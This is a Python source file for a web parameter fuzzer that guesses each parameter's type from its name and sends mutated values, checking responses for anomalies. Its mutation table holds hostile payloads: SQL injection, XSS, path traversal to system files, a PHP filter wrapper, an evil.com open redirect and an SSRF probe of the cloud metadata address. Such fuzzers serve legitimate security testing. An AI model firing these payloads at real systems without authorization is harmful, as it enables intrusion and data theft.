import uuid
import hashlib
import hmac
import secrets
import base64
import subprocess
from typing import *
import os
import sys
import re
import json
import time
import urllib3
import requests
import socket
import logging
import threading
import concurrent.futures
import ipaddress
import ssl
from urllib.parse import urlparse, urljoin, urlencode, quote
from collections import defaultdict
from bs4 import BeautifulSoup
from datetime import datetime, timezone


PARAM_TYPE_PATTERNS = {
    "id": r'(?i)(id|uid|pid|sid|account_id|user_id|item_id|order_id|profile_id)',
    "uuid": r'(?i)(uuid|guid|token|session|nonce|csrf)',
    "email": r'(?i)(email|mail|user|login|username)',
    "search": r'(?i)(search|q|query|keyword|term|filter)',
    "page": r'(?i)(page|offset|limit|start|count|per_page)',
    "file": r'(?i)(file|path|doc|document|attachment|download|upload)',
    "url": r'(?i)(url|link|redirect|next|return|referer|callback)',
    "numeric": r'(?i)(price|amount|cost|total|quantity|age|year)',
    "boolean": r'(?i)(flag|enable|disable|active|visible|published|status)',
}

TYPE_MUTATIONS: dict[str, list[dict]] = {
    "id": [
        {"name": "negative", "value": "-1"},
        {"name": "zero", "value": "0"},
        {"name": "large", "value": "9999999"},
        {"name": "float", "value": "1.5"},
        {"name": "string", "value": "abc"},
        {"name": "sql", "value": "1' OR '1'='1"},
        {"name": "special", "value": "../etc/passwd"},
        {"name": "array", "value": "id[]=1&id[]=2"},
    ],
    "uuid": [
        {"name": "empty", "value": ""},
        {"name": "invalid", "value": "not-a-uuid"},
        {"name": "all_zero", "value": "00000000-0000-0000-0000-000000000000"},
        {"name": "past_token", "value": "aaaaaaaa-bbbb-cccc-dddd-eeeeeeeeeeee"},
    ],
    "email": [
        {"name": "no_at", "value": "admin"},
        {"name": "double_at", "value": "admin@@example.com"},
        {"name": "sql_injection", "value": "admin' OR '1'='1"},
        {"name": "xss", "value": "<script>alert(1)</script>"},
        {"name": "traversal", "value": "../../etc/passwd"},
        {"name": "long", "value": "a" * 256 + "@example.com"},
    ],
    "search": [
        {"name": "sql_wildcard", "value": "%' OR '1'='1' --"},
        {"name": "xss", "value": "<img src=x onerror=alert(1)>"},
        {"name": "regex", "value": "^(?=.*[a-z])(?=.*[A-Z]).*$"},
        {"name": "null_byte", "value": "test\x00"},
        {"name": "unicode_normalize", "value": "\uff1cscript\uff1e"},
    ],
    "file": [
        {"name": "traversal", "value": "../../../etc/passwd"},
        {"name": "null_byte", "value": "../../../etc/passwd%00.jpg"},
        {"name": "windows", "value": "..\\..\\..\\windows\\win.ini"},
        {"name": "php_wrapper", "value": "php://filter/convert.base64-encode/resource=index"},
        {"name": "long_path", "value": "A" * 4096},
    ],
    "url": [
        {"name": "open_redirect", "value": "//evil.com"},
        {"name": "ssrf", "value": "http://169.254.169.254/latest/meta-data/"},
        {"name": "protocol_bypass", "value": "javascript:alert(1)"},
        {"name": "data_uri", "value": "data:text/html,<script>alert(1)</script>"},
    ],
    "numeric": [
        {"name": "negative", "value": "-1"},
        {"name": "zero", "value": "0"},
        {"name": "overflow", "value": "9999999999999999999999999999999999999"},
        {"name": "float", "value": "0.5"},
        {"name": "string", "value": "abcdefgh"},
    ],
    "boolean": [
        {"name": "not_1", "value": "0"},
        {"name": "not_0", "value": "1"},
        {"name": "string", "value": "true"},
        {"name": "empty", "value": ""},
        {"name": "random", "value": "asdfghjkl"},
    ],
}


class ContextAwareFuzzer:
    def __init__(self, request_fn: Callable):
        self._request_fn = request_fn
        self._results: list[dict] = []

    def classify_params(self, params: dict) -> dict[str, str]:
        classified = {}
        for key in params:
            param_type = "string"
            for ptype, pattern in PARAM_TYPE_PATTERNS.items():
                if re.match(pattern, key):
                    param_type = ptype
                    break
            classified[key] = param_type
        return classified

    def fuzz(self, url: str, params: dict, headers: dict | None = None) -> list[dict]:
        types = self.classify_params(params)
        for key, ptype in types.items():
            mutations = TYPE_MUTATIONS.get(ptype, [{"name": "random", "value": "test"}])
            for mutation in mutations:
                test_params = dict(params)
                test_params[key] = mutation["value"]
                body, status = self._request_fn(url, test_params, headers)
                self._results.append({
                    "param": key,
                    "type": ptype,
                    "mutation": mutation["name"],
                    "value": mutation["value"],
                    "status": status,
                    "length": len(body or ""),
                })
        return self._results

    def anomalies(self, baseline_length: int) -> list[dict]:
        return [
            r for r in self._results
            if abs(r["length"] - baseline_length) / max(baseline_length, 1) > 0.2
               or r["status"] in (500, 403, 302, 301)
        ]

